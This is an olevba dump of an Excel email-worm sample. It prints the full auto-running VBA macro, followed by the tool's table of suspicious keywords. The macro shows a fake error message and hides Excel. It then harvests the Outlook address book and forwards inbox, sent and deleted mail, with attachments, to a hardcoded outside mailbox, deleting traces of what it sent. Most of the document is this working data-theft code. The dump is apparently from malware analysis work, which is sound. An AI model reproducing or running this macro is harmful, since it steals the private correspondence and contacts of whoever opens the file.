olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSExcel.Velta.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Email-Worm.MSExcel.Velta.b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Const mstrRAIZ = "C:\"
Private Const mstrCOD = ",."
Private Const mstrBOX = "omarvelt@hotmail.com"

Private objOutlook As Object

Sub Main()
    Dim pobj As Object
    Dim pobjdoc As Object
    Dim pVect As Variant
    
    MsgBox "Error TR:194, File not found", vbOKOnly + vbCritical, "Windows"
    
    ThisWorkbook.Application.Visible = False

    Set objOutlook = CreateObject("Outlook.Application")

    LibretaDirecciones

    Bandejas

    Set objOutlook = Nothing
    
End Sub

Sub LibretaDirecciones()
    On Error Resume Next
    
    Dim pobjNameSp  As Object
    Dim pobjAddr    As Object
    Dim AddrEmail   As Object
    Dim pstrAdr     As String
    Dim ind         As Long
    
    Set NameSp = objOutlook.GetNamespace("MAPI")
    
    Set pobjAddr = NameSp.AddressLists
    
    For Each AddrEmail In pobjAddr
    
        If AddrEmail.AddressEntries.Count > 0 Then
        
            pstrAdr = vbNullString
            
            For ind = 1 To AddrEmail.AddressEntries.Count
            
                pstrAdr = pstrAdr & ";" & AddrEmail.AddressEntries.Item(ind).Address
                pstrAdr = pstrAdr & "(" & AddrEmail.AddressEntries.Item(ind).Name & ")" & vbCrLf
                
            Next
            
        End If
        
        Enviar "Libreta de Direcciones", pstrAdr
        
        'Tomar unicamente la primera Libreta de Direcciones
        Exit Sub
        
    Next
    
End Sub

'Sub EnviarAdjunto(ItemMail As Outlook.MailItem)
'    On Error Resume Next
'
'    Dim objMail     As Outlook.MailItem
'    Dim pstrFile    As String
'    Dim ind         As Long
'
'    Set objMail = objOutlook.CreateItem(olMailItem)
'
'    objMail.To = mstrBOX
'    objMail.Subject = ItemMail.Subject
'    objMail.Body = ItemMail.Body
'
'    With ItemMail
'
'        For ind = 1 To .Attachments.Count
'
'            pstrFile = mstrRAIZ & .Attachments.Item(1).FileName
'
'            .Attachments.Item(1).SaveAsFile pstrFile
'
'            objMail.Attachments.Add pstrFile
'
'        Next ind
'
'    End With
'
'    objMail.Attachments.Session.Logoff
'
'    objMail.DeleteAfterSubmit = True
'    objMail.Send
'
'    Set objMail = Nothing
'
'End Sub

Sub Enviar(pstrSubject As String, pstrBody As String)
    On Error Resume Next

    Dim objMail As Object

    Set objMail = objOutlook.CreateItem(olMailItem)

    objMail.To = mstrBOX
    objMail.Subject = pstrSubject
    objMail.Body = pstrBody

    objMail.DeleteAfterSubmit = True
    objMail.Send

    Set objMail = Nothing
    
End Sub

Private Sub Bandejas()
    On Error Resume Next
    
    Dim myNameSpace     As Object
    Dim pobjBEntrada    As Object
    Dim pobjBEnviados   As Object
    Dim pobjBElim       As Object
    Dim pobjMailItem    As Object
    Dim pstrBody        As String
    Dim ind             As Long
    Dim nMails          As Long
   
    Set myNameSpace = objOutlook.GetNamespace("MAPI")
    Set pobjBEntrada = myNameSpace.GetDefaultFolder(6)
    Set pobjBEnviados = myNameSpace.GetDefaultFolder(5)
    Set pobjBElim = myNameSpace.GetDefaultFolder(3)
    
    pstrBody = vbNullString
    nMails = 0
    
    'Bandeja de Entrada
    For ind = 1 To pobjBEntrada.Items.Count
    
        Set pobjMailItem = pobjBEntrada.Items(ind)
        
        If InStr(1, pobjMailItem.Subject, mstrCOD, vbTextCompare) > 0 Then
        
            pobjMailItem.Delete
            
        Else
        
            If pobjMailItem.Attachments.Count > 0 Then
               
                pobjMailItem.To = mstrBOX
                pobjMailItem.DeleteAfterSubmit = True
                pobjMailItem.Send
                
            Else
            
                pstrBody = pstrBody & " -------------------------------- MAIL " & ind & vbCrLf
                pstrBody = pstrBody & " -- Asunto: " & pobjMailItem.Subject & vbCrLf & vbCrLf
                pstrBody = pstrBody & pobjMailItem.Body & vbCrLf & vbCrLf
                
                nMails = nMails + 1
                
                If nMails > 10 Then
                
                    Enviar "Bandeja de Entrada - Mails sin Adjuntos", pstrBody
                    
                    pstrBody = vbNullString
                    
                    nMails = 0
                
                End If
            
            End If
            
        End If
        
        Set pobjMailItem = Nothing
        
    Next ind
    
    If nMails > 0 Then Enviar "Bandeja de Entrada - Mails sin Adjuntos", pstrBody
    
    pstrBody = vbNullString
    nMails = 0
    
    'Elementos Enviados
    For ind = 1 To pobjBEnviados.Items.Count
    
        Set pobjMailItem = pobjBEnviados.Items(ind)
        
        If pobjMailItem.Attachments.Count > 0 Then
        
            pobjMailItem.To = mstrBOX
            'pobjMailItem.DeleteAfterSubmit = True
            pobjMailItem.Send
            
        Else
        
            pstrBody = pstrBody & " -------------------------------- MAIL " & ind & vbCrLf
            pstrBody = pstrBody & " -- Asunto: " & pobjMailItem.Subject & vbCrLf & vbCrLf
            pstrBody = pstrBody & pobjMailItem.Body & vbCrLf & vbCrLf
            
            nMails = nMails + 1
            
            If nMails > 10 Then
            
                Enviar "Elementos Enviados - Mails sin Adjuntos", pstrBody
                
                pstrBody = vbNullString
                
                nMails = 0
            
            End If
        
        End If
        
        Set pobjMailItem = Nothing
        
    Next ind
    
    If nMails > 0 Then Enviar "Elementos Enviados - Mails sin Adjuntos", pstrBody

    pstrBody = vbNullString
    nMails = 0

    'Elementos Eliminados,
    For ind = 1 To pobjBElim.Items.Count

        Set pobjMailItem = pobjBElim.Items(ind)

        If InStr(1, pobjMailItem.Subject, mstrCOD, vbTextCompare) > 0 Then

            pobjMailItem.Delete

        Else

            If pobjMailItem.Attachments.Count > 0 Then

                pobjMailItem.To = mstrBOX
                'pobjMailItem.DeleteAfterSubmit = True
                pobjMailItem.Send

            Else

                pstrBody = pstrBody & " -------------------------------- MAIL " & ind & vbCrLf
                pstrBody = pstrBody & " -- Asunto: " & pobjMailItem.Subject & vbCrLf & vbCrLf
                pstrBody = pstrBody & pobjMailItem.Body & vbCrLf & vbCrLf

                nMails = nMails + 1

                If nMails > 10 Then

                    Enviar "Elementos Eliminados - Mails sin Adjuntos", pstrBody

                    pstrBody = vbNullString

                    nMails = 0

                End If

            End If

        End If

        Set pobjMailItem = Nothing

    Next ind

    If nMails > 0 Then Enviar "Elementos Eliminados - Mails sin Adjuntos", pstrBody
    
    Set pobjBEntrada = Nothing
    Set myBEnviados = Nothing
    Set myBElim = Nothing
    
End Sub

Private Sub Workbook_Open()
    Main
End Sub
-------------------------------------------------------------------------------
VBA MACRO Hoja1.cls 
in file: Email-Worm.MSExcel.Velta.b - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja2.cls 
in file: Email-Worm.MSExcel.Velta.b - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja3.cls 
in file: Email-Worm.MSExcel.Velta.b - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

